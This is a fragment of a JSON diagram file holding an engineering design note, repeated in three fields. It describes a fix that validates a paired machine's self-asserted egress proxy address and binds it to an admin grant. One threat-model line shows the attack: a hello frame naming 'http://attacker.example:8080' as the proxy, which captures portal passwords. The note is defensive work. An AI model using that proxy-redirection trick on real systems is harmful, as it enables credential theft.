      "lineHeight": 1.25,
      "text": "AS-BUILT 2026-08-19 (P4 ROUND EIGHT: a machine's SELF-ASSERTED egress address stops being an\nauthorisation - the endpoint is validated, and the GRANT names it).\n\nTHE GAP, and why it opened only now. I-3 already said the right thing about a machine's\nCAPABILITIES: what it advertises is a self-assertion, what the org granted is the authorisation, and\n`egressCandidatesForOrg` intersects the two. The ADDRESS travelled beside the capability on the same\n`hello` frame and inherited none of that. It is typed on the wire as a free\n`z.string().max(255).optional()`, `bridge/server.ts` forwarded it verbatim, `registerPairing` stored\nit verbatim, and the intersection passed it through UNTOUCHED. Nothing on the path looked at it - and\nthis branch is what gave that path a production consumer: `resolveEgress` -> `proxyOptionFor` ->\n`browser.newContext({ proxy })` for the org's HOSTED Chromium.\n\n  attack   a machine in org A sends hello {capabilities:['egress.residential'],\n           egressEndpoint:'http://attacker.example:8080'}. The admin grants egress.residential to\n           that pairing - authorising the MACHINE; the grant record carried no endpoint and the\n           admin surface returned capability NAMES, so the address was never shown to the person\n           deciding. The org's hosted Chromium then launches through the attacker's proxy, and a\n           credential-gated step submits the portal password through it. A compromised daemon could\n           re-point the destination on ANY reconnect with no new grant.\n\nTHE FIX IS TWO HALVES, and neither is sufficient alone.\n\n  1  SHAPE - api/src/bridge/egress-endpoint.ts (NEW, inside `bridge/`; no new module boundary and no\n     new tier edge - it is a pure validator with no imports).\n       normaliseEgressEndpoint(raw, policy) -> canonical `scheme://host[:port]` or null.\n       scheme in {http, https, socks5}; Playwright's short form `host:port` is normalised to http.\n       no embedded credentials (Playwright takes those as their own fields), no path/query/fragment.\n       REFUSED: loopback (incl. `localhost`, `[::1]`, `[::ffff:127.0.0.1]`), the unspecified\n         address, link-local 169.254/16 and fe80::/10 - which is where the cloud metadata service\n         lives - multicast/broadcast, and the RFC1918 ranges.\n       ALLOWED BY NAME: 100.64.0.0/10 and fd7a:115c:a1e0::/48. The endpoint is a TAILNET address, so\n         a naive \"reject private ranges\" rule would throw away every legitimate value of the field:\n         100.64/10 is RFC 6598 shared address space.\n       EKOA_BRIDGE_ALLOW_PRIVATE_EGRESS lifts loopback + RFC1918 for a developer. It does NOT lift\n         link-local: a metadata endpoint is never a proxy, and a dev switch has no business there.\n       CANONICAL, because the authorisation below is an equality test - two spellings of one address\n         must not read as two authorisations in either direction.\n     Applied at BOTH ends: at ingress (`bridge/server.ts` hello, which also warns the operator) and\n     at the write (`registerPairing`), so a row written by any other path cannot become a target.\n     Honest limit, stated in the module: a DNS name is accepted on shape alone - nothing resolves\n     here, so a name pointing at loopback is not caught by this half.\n\n  2  AUTHORISATION - CapabilityGrantDoc.egressEndpoint. An `egress.residential` grant is not \"this\n     machine may carry traffic\", it is \"this tenant's traffic may leave by THIS DOOR\".\n     `grantCapability` now REQUIRES a usable endpoint for that capability and throws\n     `CapabilityGrantError` otherwise - loudly, at the moment a person decides, rather than silently\n     at the moment a run needs it. `egressCandidatesForOrg` compares the grant's address against\n     what the machine CURRENTLY advertises, canonically; when they differ the candidate carries\n     neither `egress.residential` nor an endpoint at all, so `residentialEgressPairings` filters it\n     and `resolveEgress` refuses or queues. The changed-endpoint reconnect therefore fails CLOSED.\n     `advertisedCapabilitiesForOrg` now carries the advertised address too, so the admin surface can\n     show what is being authorised instead of a capability name.\n\nALSO: the advertisement REPLACES the address. `registerPairing`'s `egressEndpoint` is a TRI-STATE -\n`undefined` means \"this registration is not an advertisement\" (the CONNECT path, before the machine\nhas said anything, must not erase what it said last time) and `null` means \"this advertisement\noffers no egress\", which CLEARS the stored one. It used to keep the previous value on a hello with\nno endpoint, so a machine could never un-offer a route it once offered - the merge-instead-of-replace\ndefect the capability list already avoided.\n\nREACHABILITY, honestly. `localBrowserEnabled` is false in production by default, so the hosted\nlaunch this protects is a non-prod path until an operator opens the switch. And there is no\nadmin ROUTE that grants a capability at all today (`grantCapability` has no caller outside tests),\nso no production org currently holds a grant of any kind. Both narrow the blast radius of the\ndefect; neither is a reason to ship the path unguarded, and the grant surface that does not exist\nyet now cannot be written without naming the address it authorises.",
      "rawText": "AS-BUILT 2026-08-19 (P4 ROUND EIGHT: a machine's SELF-ASSERTED egress address stops being an\nauthorisation - the endpoint is validated, and the GRANT names it).\n\nTHE GAP, and why it opened only now. I-3 already said the right thing about a machine's\nCAPABILITIES: what it advertises is a self-assertion, what the org granted is the authorisation, and\n`egressCandidatesForOrg` intersects the two. The ADDRESS travelled beside the capability on the same\n`hello` frame and inherited none of that. It is typed on the wire as a free\n`z.string().max(255).optional()`, `bridge/server.ts` forwarded it verbatim, `registerPairing` stored\nit verbatim, and the intersection passed it through UNTOUCHED. Nothing on the path looked at it - and\nthis branch is what gave that path a production consumer: `resolveEgress` -> `proxyOptionFor` ->\n`browser.newContext({ proxy })` for the org's HOSTED Chromium.\n\n  attack   a machine in org A sends hello {capabilities:['egress.residential'],\n           egressEndpoint:'http://attacker.example:8080'}. The admin grants egress.residential to\n           that pairing - authorising the MACHINE; the grant record carried no endpoint and the\n           admin surface returned capability NAMES, so the address was never shown to the person\n           deciding. The org's hosted Chromium then launches through the attacker's proxy, and a\n           credential-gated step submits the portal password through it. A compromised daemon could\n           re-point the destination on ANY reconnect with no new grant.\n\nTHE FIX IS TWO HALVES, and neither is sufficient alone.\n\n  1  SHAPE - api/src/bridge/egress-endpoint.ts (NEW, inside `bridge/`; no new module boundary and no\n     new tier edge - it is a pure validator with no imports).\n       normaliseEgressEndpoint(raw, policy) -> canonical `scheme://host[:port]` or null.\n       scheme in {http, https, socks5}; Playwright's short form `host:port` is normalised to http.\n       no embedded credentials (Playwright takes those as their own fields), no path/query/fragment.\n       REFUSED: loopback (incl. `localhost`, `[::1]`, `[::ffff:127.0.0.1]`), the unspecified\n         address, link-local 169.254/16 and fe80::/10 - which is where the cloud metadata service\n         lives - multicast/broadcast, and the RFC1918 ranges.\n       ALLOWED BY NAME: 100.64.0.0/10 and fd7a:115c:a1e0::/48. The endpoint is a TAILNET address, so\n         a naive \"reject private ranges\" rule would throw away every legitimate value of the field:\n         100.64/10 is RFC 6598 shared address space.\n       EKOA_BRIDGE_ALLOW_PRIVATE_EGRESS lifts loopback + RFC1918 for a developer. It does NOT lift\n         link-local: a metadata endpoint is never a proxy, and a dev switch has no business there.\n       CANONICAL, because the authorisation below is an equality test - two spellings of one address\n         must not read as two authorisations in either direction.\n     Applied at BOTH ends: at ingress (`bridge/server.ts` hello, which also warns the operator) and\n     at the write (`registerPairing`), so a row written by any other path cannot become a target.\n     Honest limit, stated in the module: a DNS name is accepted on shape alone - nothing resolves\n     here, so a name pointing at loopback is not caught by this half.\n\n  2  AUTHORISATION - CapabilityGrantDoc.egressEndpoint. An `egress.residential` grant is not \"this\n     machine may carry traffic\", it is \"this tenant's traffic may leave by THIS DOOR\".\n     `grantCapability` now REQUIRES a usable endpoint for that capability and throws\n     `CapabilityGrantError` otherwise - loudly, at the moment a person decides, rather than silently\n     at the moment a run needs it. `egressCandidatesForOrg` compares the grant's address against\n     what the machine CURRENTLY advertises, canonically; when they differ the candidate carries\n     neither `egress.residential` nor an endpoint at all, so `residentialEgressPairings` filters it\n     and `resolveEgress` refuses or queues. The changed-endpoint reconnect therefore fails CLOSED.\n     `advertisedCapabilitiesForOrg` now carries the advertised address too, so the admin surface can\n     show what is being authorised instead of a capability name.\n\nALSO: the advertisement REPLACES the address. `registerPairing`'s `egressEndpoint` is a TRI-STATE -\n`undefined` means \"this registration is not an advertisement\" (the CONNECT path, before the machine\nhas said anything, must not erase what it said last time) and `null` means \"this advertisement\noffers no egress\", which CLEARS the stored one. It used to keep the previous value on a hello with\nno endpoint, so a machine could never un-offer a route it once offered - the merge-instead-of-replace\ndefect the capability list already avoided.\n\nREACHABILITY, honestly. `localBrowserEnabled` is false in production by default, so the hosted\nlaunch this protects is a non-prod path until an operator opens the switch. And there is no\nadmin ROUTE that grants a capability at all today (`grantCapability` has no caller outside tests),\nso no production org currently holds a grant of any kind. Both narrow the blast radius of the\ndefect; neither is a reason to ship the path unguarded, and the grant surface that does not exist\nyet now cannot be written without naming the address it authorises.",
      "originalText": "AS-BUILT 2026-08-19 (P4 ROUND EIGHT: a machine's SELF-ASSERTED egress address stops being an\nauthorisation - the endpoint is validated, and the GRANT names it).\n\nTHE GAP, and why it opened only now. I-3 already said the right thing about a machine's\nCAPABILITIES: what it advertises is a self-assertion, what the org granted is the authorisation, and\n`egressCandidatesForOrg` intersects the two. The ADDRESS travelled beside the capability on the same\n`hello` frame and inherited none of that. It is typed on the wire as a free\n`z.string().max(255).optional()`, `bridge/server.ts` forwarded it verbatim, `registerPairing` stored\nit verbatim, and the intersection passed it through UNTOUCHED. Nothing on the path looked at it - and\nthis branch is what gave that path a production consumer: `resolveEgress` -> `proxyOptionFor` ->\n`browser.newContext({ proxy })` for the org's HOSTED Chromium.\n\n  attack   a machine in org A sends hello {capabilities:['egress.residential'],\n           egressEndpoint:'http://attacker.example:8080'}. The admin grants egress.residential to\n           that pairing - authorising the MACHINE; the grant record carried no endpoint and the\n           admin surface returned capability NAMES, so the address was never shown to the person\n           deciding. The org's hosted Chromium then launches through the attacker's proxy, and a\n           credential-gated step submits the portal password through it. A compromised daemon could\n           re-point the destination on ANY reconnect with no new grant.\n\nTHE FIX IS TWO HALVES, and neither is sufficient alone.\n\n  1  SHAPE - api/src/bridge/egress-endpoint.ts (NEW, inside `bridge/`; no new module boundary and no\n     new tier edge - it is a pure validator with no imports).\n       normaliseEgressEndpoint(raw, policy) -> canonical `scheme://host[:port]` or null.\n       scheme in {http, https, socks5}; Playwright's short form `host:port` is normalised to http.\n       no embedded credentials (Playwright takes those as their own fields), no path/query/fragment.\n       REFUSED: loopback (incl. `localhost`, `[::1]`, `[::ffff:127.0.0.1]`), the unspecified\n         address, link-local 169.254/16 and fe80::/10 - which is where the cloud metadata service\n         lives - multicast/broadcast, and the RFC1918 ranges.\n       ALLOWED BY NAME: 100.64.0.0/10 and fd7a:115c:a1e0::/48. The endpoint is a TAILNET address, so\n         a naive \"reject private ranges\" rule would throw away every legitimate value of the field:\n         100.64/10 is RFC 6598 shared address space.\n       EKOA_BRIDGE_ALLOW_PRIVATE_EGRESS lifts loopback + RFC1918 for a developer. It does NOT lift\n         link-local: a metadata endpoint is never a proxy, and a dev switch has no business there.\n       CANONICAL, because the authorisation below is an equality test - two spellings of one address\n         must not read as two authorisations in either direction.\n     Applied at BOTH ends: at ingress (`bridge/server.ts` hello, which also warns the operator) and\n     at the write (`registerPairing`), so a row written by any other path cannot become a target.\n     Honest limit, stated in the module: a DNS name is accepted on shape alone - nothing resolves\n     here, so a name pointing at loopback is not caught by this half.\n\n  2  AUTHORISATION - CapabilityGrantDoc.egressEndpoint. An `egress.residential` grant is not \"this\n     machine may carry traffic\", it is \"this tenant's traffic may leave by THIS DOOR\".\n     `grantCapability` now REQUIRES a usable endpoint for that capability and throws\n     `CapabilityGrantError` otherwise - loudly, at the moment a person decides, rather than silently\n     at the moment a run needs it. `egressCandidatesForOrg` compares the grant's address against\n     what the machine CURRENTLY advertises, canonically; when they differ the candidate carries\n     neither `egress.residential` nor an endpoint at all, so `residentialEgressPairings` filters it\n     and `resolveEgress` refuses or queues. The changed-endpoint reconnect therefore fails CLOSED.\n     `advertisedCapabilitiesForOrg` now carries the advertised address too, so the admin surface can\n     show what is being authorised instead of a capability name.\n\nALSO: the advertisement REPLACES the address. `registerPairing`'s `egressEndpoint` is a TRI-STATE -\n`undefined` means \"this registration is not an advertisement\" (the CONNECT path, before the machine\nhas said anything, must not erase what it said last time) and `null` means \"this advertisement\noffers no egress\", which CLEARS the stored one. It used to keep the previous value on a hello with\nno endpoint, so a machine could never un-offer a route it once offered - the merge-instead-of-replace\ndefect the capability list already avoided.\n\nREACHABILITY, honestly. `localBrowserEnabled` is false in production by default, so the hosted\nlaunch this protects is a non-prod path until an operator opens the switch. And there is no\nadmin ROUTE that grants a capability at all today (`grantCapability` has no caller outside tests),\nso no production org currently holds a grant of any kind. Both narrow the blast radius of the\ndefect; neither is a reason to ship the path unguarded, and the grant surface that does not exist\nyet now cannot be written without naming the address it authorises."
